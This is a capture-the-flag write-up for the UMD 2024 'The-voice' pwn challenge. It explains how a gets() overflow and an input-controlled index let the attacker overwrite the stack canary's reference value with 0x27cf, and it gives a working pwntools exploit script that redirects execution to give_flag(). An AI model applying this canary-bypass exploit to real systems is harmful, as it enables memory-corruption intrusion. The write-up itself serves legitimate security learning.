---
title: The-voice
type: writeup
date: 2024-04-26T14:23:28+03:00
description: Writeup for The-voice [UMD 2024]
author: PineBel
tags:
  - pwn
draft: false
---
## Challenge Description

Firing your weapon when the spice harvester's shields are down requires exceptional timing.

### Intuition
This was an easy pwn challenge. We get the source code but it doesn't hint anything besides an obvious BOF and a give_flag() function. Sadly we have a canary so we are a bit stuck..

If we open the binary in Ghidra we can see that we can actually write over the canary from the stack the value 10191.

```C
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
    ....
  gets(local_28);
  iVar1 = FUN_00401100(local_28);
  *(undefined8 *)(in_FS_OFFSET + (long)iVar1 * 8 + -0x50) = 0x27cf;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }

```
### Solution 

The solution is pretty simple, we calculate what value our input needs to have so we can write 0x27cf where the actual canary is (fs+0x28), and after that we can just write over local_10 the same value and bypass the canary check this way and return to the give_flag() function.

```py
from pwn import *

target = process("./the_voice")
target = remote("challs.umdctf.io","31192")
target.recvuntil(b".")


flag = p64(0x4011f6)
payload = b"0"*22+b"15"+p64(0x27cf)+b"a"*8+flag
target.sendline(payload)
target.interactive()

```